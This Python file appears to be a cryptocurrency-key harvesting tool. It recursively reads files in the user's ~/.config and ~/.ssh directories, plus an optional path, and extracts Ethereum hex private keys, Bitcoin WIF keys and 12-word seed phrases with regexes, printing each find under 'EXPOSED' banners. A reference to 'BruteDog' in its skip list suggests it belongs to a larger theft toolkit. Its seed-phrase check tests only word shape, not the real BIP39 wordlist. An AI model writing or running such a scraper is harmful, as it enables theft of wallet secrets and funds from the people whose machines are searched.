import os
import re
import sys

def is_valid_bip39_seed(text):
    """
    Strict validation for BIP39 seed phrases: Must be exactly 12 or 24 words,
    contain only alphabetic characters, and consist solely of valid mnemonic words.
    """
    words = text.strip().lower().split()
    if len(words) not in [12, 24]:
        return False
    
    # Quick filter: if any word contains symbols, numbers, or code syntax, reject immediately
    for w in words:
        if not w.isalpha() or len(w) < 3 or len(w) > 8:
            return False
            
    # Basic English BIP39 sample check to ensure it's not source code text
    code_indicators = ["import", "def", "class", "return", "self", "setup", "sys", "from", "http", "git", "file", "print"]
    if any(ind in words for ind in code_indicators):
        return False
        
    return True

def is_valid_evm_key(key_str):
    clean = key_str[2:] if key_str.startswith("0x") else key_str
    if len(clean) != 64:
        return False
    try:
        int(clean, 16)
        if clean == "0" * 64 or "test" in clean.lower():
            return False
        return True
    except ValueError:
        return False

def harvest_private_keys(root_dir="."):
    """
    Zero-Lag Live Terminal Cryptographic Artifact Scraper:
    - Instantly streams verified private keys, WIFs, and seed phrases straight to stdout.
    - Completely eliminates local report file-saving dependencies.
    """
    sys.stdout.write(f"\n\033[95m[***] ENGAGING LIVE CRYPTOGRAPHIC ARTIFACT SCRAPER [***]\033[0m\n")
    sys.stdout.flush()
    
    harvested_artifacts = []
    hex_key_pattern = re.compile(r'\b(?:0x)?[a-fA-F0-9]{64}\b')
    btc_wif_pattern = re.compile(r'\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b')
    
    search_paths = [
        os.path.expanduser("~/.config"),
        os.path.expanduser("~/.ssh")
    ]
    
    if root_dir != "." and os.path.exists(root_dir):
        search_paths.append(os.path.abspath(root_dir))
    
    scanned_files = 0
    for path in search_paths:
        if not os.path.exists(path):
            continue
            
        for current_root, dirs, files in os.walk(path):
            skip_tokens = ["/tmp", "site-packages", "pip-install", "venv", ".git", "node_modules", "__pycache__", "reports", "BruteDog"]
            if any(token in current_root for token in skip_tokens):
                continue
                
            for file in files:
                if file.endswith(('.txt', '.env', '.json', '.log', '.conf', '.ini', '.pem', '.key')):
                    file_path = os.path.join(current_root, file)
                    scanned_files += 1
                    try:
                        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                            
                            # 1. Scan for EVM Private Keys
                            for match in hex_key_pattern.findall(content):
                                if is_valid_evm_key(match):
                                    full_key = match if match.startswith("0x") else "0x" + match
                                    artifact = {"type": "Hex Private Key (EVM)", "key_content": full_key, "source": file_path}
                                    if artifact not in harvested_artifacts:
                                        harvested_artifacts.append(artifact)
                                        sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE EVM KEY EXPOSED [***]\033[0m\n")
                                        sys.stdout.write(f"  ├── Source : {file_path}\n")
                                        sys.stdout.write(f"  └── Key    : \033[92m{full_key}\033[0m\n")
                                        sys.stdout.flush()
                                        
                            # 2. Scan for Bitcoin WIF Keys
                            for match in btc_wif_pattern.findall(content):
                                artifact = {"type": "Bitcoin WIF Key", "key_content": match, "source": file_path}
                                if artifact not in harvested_artifacts:
                                    harvested_artifacts.append(artifact)
                                    sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE BTC WIF KEY EXPOSED [***]\033[0m\n")
                                    sys.stdout.write(f"  ├── Source : {file_path}\n")
                                    sys.stdout.write(f"  └── WIF    : \033[92m{match}\033[0m\n")
                                    sys.stdout.flush()

                            # 3. Scan for True BIP39 Seed Phrases
                            words = content.split()
                            if len(words) >= 12:
                                for i in range(len(words) - 11):
                                    chunk = " ".join(words[i:i+12])
                                    if is_valid_bip39_seed(chunk):
                                        artifact = {"type": "BIP39 Seed Phrase", "key_content": chunk, "source": file_path}
                                        if artifact not in harvested_artifacts:
                                            harvested_artifacts.append(artifact)
                                            sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE SEED PHRASE EXPOSED [***]\033[0m\n")
                                            sys.stdout.write(f"  ├── Source : {file_path}\n")
                                            sys.stdout.write(f"  └── Phrase : \033[93m{chunk}\033[0m\n")
                                            sys.stdout.flush()
                                            break
                    except Exception:
                        pass

    sys.stdout.write(f"\n\033[36m[*] Scanned {scanned_files} files. Total live verified artifacts streamed: {len(harvested_artifacts)}\033[0m\n\n")
    sys.stdout.flush()
    
    return harvested_artifacts
